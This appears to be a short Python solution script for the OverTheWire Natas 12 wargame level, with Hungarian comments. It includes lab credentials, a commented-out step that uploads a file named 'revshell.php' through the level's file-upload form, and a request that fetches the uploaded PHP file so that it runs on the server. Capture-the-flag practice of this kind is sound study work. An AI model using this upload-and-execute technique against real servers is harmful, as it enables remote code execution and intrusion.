from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re


username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'

url = 'http://%s.natas.labs.overthewire.org/upload/ffkyn1ey79.php' % username

session = requests.Session()
#reponse = session.get(url , auth=(username, password))
#                           File feltöltés post-al                              ezeket az adatokat kell elküldeni, ez látszik a HTML kódból is
#reponse = session.post(url ,files= {"uploadedfile": open('revshell.php','rb')}, data={ "filename": "revhell.php", "MAX_FILESIZE": "1000" }, auth=(username, password))

#php futtatása
reponse = session.get(url , auth=(username, password))

content = reponse.text

print(content)